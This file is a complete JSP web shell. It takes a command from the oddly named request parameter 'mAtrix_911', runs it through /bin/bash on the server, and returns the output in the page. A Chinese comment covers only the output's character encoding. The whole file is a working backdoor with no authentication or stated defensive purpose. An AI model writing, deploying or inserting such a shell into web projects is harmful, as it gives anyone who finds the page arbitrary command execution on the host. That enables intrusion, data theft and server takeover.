<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*,java.util.*,java.nio.charset.*" %>
<%
/* 中文：请求/响应 UTF-8；子进程输出按字节解码（勿用 Scanner(InputStream) 默认编码） */
request.setCharacterEncoding("UTF-8");
response.setContentType("text/html; charset=UTF-8");
response.setCharacterEncoding("UTF-8");

String cmd = request.getParameter("mAtrix_911");
if (cmd != null && !cmd.isEmpty()) {
    ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    byte[] buf = new byte[4096];
    int n;
    InputStream is = p.getInputStream();
    while ((n = is.read(buf)) != -1) {
        bos.write(buf, 0, n);
    }
    try {
        p.waitFor();
    } catch (InterruptedException ie) {
        Thread.currentThread().interrupt();
    }
    byte[] raw = bos.toByteArray();
    String text;
    if (raw.length == 0) {
        text = "";
    } else {
        text = new String(raw, StandardCharsets.UTF_8);
        if (text.indexOf('\uFFFD') >= 0) {
            try {
                text = new String(raw, Charset.forName("GB18030"));
            } catch (Exception ignored) {
                try {
                    text = new String(raw, Charset.forName("GBK"));
                } catch (Exception e2) {
                }
            }
        }
    }
    out.print("<pre>");
    out.print(text.replace("<", "&lt;"));
    out.println("</pre>");
}
%>
